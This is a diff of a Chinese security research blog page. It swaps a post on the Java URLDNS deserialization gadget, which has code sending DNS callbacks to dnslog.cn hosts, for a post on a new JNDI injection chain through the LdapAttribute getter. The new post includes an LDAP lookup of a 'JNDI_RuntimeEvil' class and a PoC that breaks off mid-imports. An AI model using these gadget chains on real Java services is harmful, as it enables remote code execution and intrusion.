@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>CC重启之URLDNS补课 | Godown_blog</title>
+  <title>LdapAttribute getter JNDI | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B888.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8161.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        CC重启之URLDNS补课
+        LdapAttribute getter JNDI
       </span>
     </div>
     
@@ -619,74 +619,87 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p>在写CC6的时候，发现后半截是URLDNS的链，来重新构造一遍URLDNS。</p>
-<p>他妈的，护网还被鸽了，面试是没挂过的，项目是没去过的。</p>
-<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><h3 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h3><p>漏洞触发点在InetAddress#getByName()能触发DNS解析</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211430126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211430126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>同样来自于InetAddress的getHostAddress调用了getByName方法。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211518306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211518306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>抽象类java.net.URLStreamHandler的hashCode调用了getHostAddress。注意这里是需要URL参数的hashCode()，而不是贼多方法都调用的那个无参hashCode()。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211715438.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717211715438.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>这个有参hashCode只在URL类中使用</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717212309900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717212309900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>URL.hashCode()如下</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213805181.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213805181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>那我们如何传参向hashCode呢？handler已经定义为URLStreamHandler了，this是把当前对象传进去。</p>
-<blockquote>
-<p>在URL类中先声明了抽象类URLStreamHandler的变量，后面会根据协议选择用哪个子类来处理这个URL</p>
-<blockquote>
-<p>Java中可以先定义一个抽象类的变量，如URLStreamHandler handler，但不能用这个变量来实例化一个对象</p>
-</blockquote>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717220034094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717220034094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-</blockquote>
-<p>URL有公开的构造函数，我们用最简单那个</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214433315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214433315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>我们用dnslog试一下（记得要加协议，构造函数传递到最后一个会进行判断）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://845yoh.dnslog.cn&quot;</span>);</span><br><span class="line">    url.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p>在触发JNDI注入的时候，我们用到的一个JNDI Client如下，用的LDAP协议：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDNIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteInterface) initialContext.lookup(<span class="string">&quot;ldap://127.0.0.1:1099/#JNDI_RuntimeEvil&quot;</span>);<span class="comment">//need ldap </span></span><br><span class="line">        remoteObject.sayHello(<span class="string">&quot;JNDI&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214722789.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214722789.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>完全是没问题</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214804868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717214804868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="链接到readObject"><a href="#链接到readObject" class="headerlink" title="链接到readObject"></a>链接到readObject</h3><p>调用URL.hashCode()的地方很多</p>
-<p>官方给出的下一步是HashMap#hash()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213010355.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213010355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>正好在HashMap的readObject里调用了hash()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213130350.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240717213130350.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>读一下上面那张图最后一个循环，循环从map中读取key和value。我们搞一个key为url的map去反序列化就行了。</p>
-<p>我们先序列化</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://icguiixgku.dgrh3.cn&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="JNDI-Reference那些事"><a href="#JNDI-Reference那些事" class="headerlink" title="JNDI Reference那些事"></a>JNDI Reference那些事</h2><p>JNDI实际上在两个类型下走的是两个注入逻辑</p>
+<h3 id="类型1：RMI-Reference封装"><a href="#类型1：RMI-Reference封装" class="headerlink" title="类型1：RMI Reference封装"></a>类型1：RMI Reference封装</h3><p>marshalsec生成的就是这个类型的poc</p>
+<p>在RMI协议下，用Reference封装传输的类，是会经过RegistryContext.lookup调用decodeObject去解封装的。跟进这个decodeObject可以发现，调用了NamingManager.getObjectInstance</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162529427.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162529427.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604162529427"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162548373.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162548373.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604162548373"></p>
+<p>接下来的代码我们很熟悉了，就是判断是否为Reference，并调用getObjectFactoryFromReference和factory.getObjectInstance</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162840413.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162840413.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604162840413"></p>
+<p>从InitialContext开始调用栈如下：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162949263.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604162949263.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604162949263"></p>
+<p>事实上RMI型进行JNDI注入也必须用Reference封装，详情见<a href="https://godownio.github.io/2024/09/25/jndi-zhu-ru/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">https://godownio.github.io/2024/09/25/jndi-zhu-ru/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90</a></p>
+<h3 id="类型2：LDAP-非Reference封装"><a href="#类型2：LDAP-非Reference封装" class="headerlink" title="类型2：LDAP 非Reference封装"></a>类型2：LDAP 非Reference封装</h3><p>LDAP协议进行JNDI注入时不需要用Reference封装，我们看栈，跟上面对比得到不同的是从URL生成的Context是ldapURLContext，导致了后续的处理不同</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172421360.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172421360.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604172421360"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172456975.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172456975.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604172456975"></p>
+<p>在LdapCtx.c_lookup中，调用了DirectoryManager.getObjectInstance</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172549271.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172549271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604172549271"></p>
+<p>可以发现DirectoryManager.getObjectInstance和NamingManager.getObjectInstance几乎没区别</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172656933.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172656933.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604172656933"></p>
+<p>因为NamingManager的作用如下：</p>
+<ul>
+<li><p>作用范围较广，包含普通命名服务（如：<code>java:comp/env</code>）的处理。</p>
+</li>
+<li><p>处理 URL 前缀（如：<code>ldap:</code>、<code>rmi:</code>、<code>corba:</code>）并定位适当的上下文工厂。</p>
+</li>
+</ul>
+<p>DirectoryManager是 <code>NamingManager</code> 的一个子集或专门扩展，<strong>专门用于支持目录服务（如 LDAP）相关操作</strong>。处理带属性的对象工厂实例创建，类似于 NamingManager，但面向更“结构化”的服务，如 LDAP 目录。两个的核心逻辑其实没什么区别</p>
+<h3 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h3><p>我们回过头来看为什么RMI不能用非Reference去注入，跟进这个registry.lookup</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604170940427.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604170940427.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604170940427"></p>
+<p>是我们熟悉的RegistryImpl_Stub.lookup，不过这个方法显然只能触发RMI的原生反序列化攻击，也就是JRMP，而不是JNDI，它并没有调用到getObjectFactoryFromReference和factory.getObjectInstance，可以说JNDI我们只看这两个方法，而不是lookup</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604171016229.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604171016229.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604171016229"></p>
+<p>所以我们理论上可以总结为，RMI打JNDI就是要用Reference封装，而Ldap打JNDI，我们是自己写了一个Ldap服务器，你去看代码逻辑可以知道是把恶意http地址绑定在了attribute上，而没有用到Reference</p>
+<h2 id="LdapAttribute-JNDI"><a href="#LdapAttribute-JNDI" class="headerlink" title="LdapAttribute JNDI"></a>LdapAttribute JNDI</h2><p>根据上面Ldap协议打JNDI提到的链，可以知道不止InitialContext能触发JNDI，这条链上的方法理论上都能触发，不过这些方法显然反序列化不好触发</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172421360.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604172421360.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250604172421360"></p>
+<p>也就是包括以下方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br></pre></td></tr></table></figure>
 
-<p>发现只是序列化就触发了DNS请求（我是太刀侠，提前预知了这里会DNS请求</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174318915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174318915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>发现在map.put的时候就调用了一遍hash</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174532780.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719174532780.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>这没道理的，还没打到别人电脑上，DNS平台就有请求了，影响判断。我们得让put不触发dns请求</p>
-<blockquote>
-<p>至于为什么要通过反射修改URL类而不是HashMap类，是因为HashMap本身并没有提供直接修改key的方法。这是因为Map接口的设计原则之一就是key的不可变性，一旦一个键值对被放入Map中，它的键就不能改变。如果改变了key，那么Map就无法定位到原来的条目。</p>
-<p>如果你需要“修改”一个HashMap中的key，实际上的操作流程是：使用remove()方法移除旧的键值对。使用put()方法插入新的键值对。</p>
-<p>HashMap内键值对以Node的形式存储，链表链接，超过一定阈值还会变成红黑树</p>
-</blockquote>
-<p>再倒回来看URL#hashCode()，如果hashCode值不为-1，则直接返回。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719191216794.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240719191216794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>那我们通过反射，在put前把值改为不等于-1，put后改为-1</p>
-<p>完整代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c6lmkl.dnslog.cn&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>把sun包加到库后再查找用法（不然不准），用8u65的sun包就行</p>
+<p>找到ComponentContext#c_resolveIntermediate_nns调用了c_lookup</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605101738354.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605101738354.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605101738354"></p>
+<p>给个链子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LdapAttribute.getAttributeDefinition() -&gt;</span><br><span class="line">   PartialCompositeDirContext.getSchema() -&gt;</span><br><span class="line">   ComponentContext.p_getSchema() -&gt; p_resolveIntermediate() -&gt; c_resolveIntermediate_nns()</span><br><span class="line">   LdapCtx.c_lookup() -&gt;</span><br><span class="line">   DirectoryManager.getObjectInstance</span><br></pre></td></tr></table></figure>
 
-<p>现在就不会误报了。由于DNS缓存刷新时间的问题，你需要多发几次包或者等一会儿再运行。</p>
-<p>完整代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c6lmkl.dnslog.cn&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">    map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">    hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">    serialize(map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>到source点，LdapAttribute.getAttributeDefinition是个getter，我们需要注意的关键是这个函数是没有参数的，这才严格满足getter的定义</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605105427317.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605105427317.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605105427317"></p>
+<h3 id="poc构造"><a href="#poc构造" class="headerlink" title="poc构造"></a>poc构造</h3><p>我们找一个触发到getter的地方，cb链的PropertyUtils.getProperty、jackson原生反序列化POJONode链、fastjson 1.2.83原生反序列化JSONObject、rome链等都可以</p>
+<p>参数的话，可以打ldap JNDI的时候打个断点，看下向LdapCtx.c_lookup传的参数，为var1和var2</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605110642551.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605110642551.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605110642551"></p>
+<p>向上分析，得知参数来自getSchema的参数，第二个参数Continuation根据Name var1就能得到</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605111831051.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605111831051.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605111831051"></p>
+<p>于是我们只用控制rdn为我们需要的CompositeName，以及getBaseCtx返回PartialCompositeContext</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605111928961.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605111928961.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605111928961"></p>
+<p>getBaseCtx默认返回InitialDirContext</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112243197.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112243197.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605112243197"></p>
+<p>我们手动设置的话，这个参数为transient</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112758938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112758938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605112758938"></p>
+<p>不过不重要，序列化时会变相存储这个字段</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112842138.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605112842138.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605112842138"></p>
+<p>这里以cb链触发getter为例给个poc：</p>
+<p>LdapCtx构造函数参数</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610164605462.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610164605462.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250610164605462"></p>
+<p>注意在p_resolveIntermediate有个p_parseComponent，需要var5和var6不为空才去解析后面</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165226802.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165226802.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250610165226802"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165409930.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165409930.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250610165409930"></p>
+<p>那么类名前面随便加个xx&#x2F;就行了，如<code>a/#JNDI_RuntimeEvil</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.misc;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.ldap.LdapCtx;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CompositeName;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> 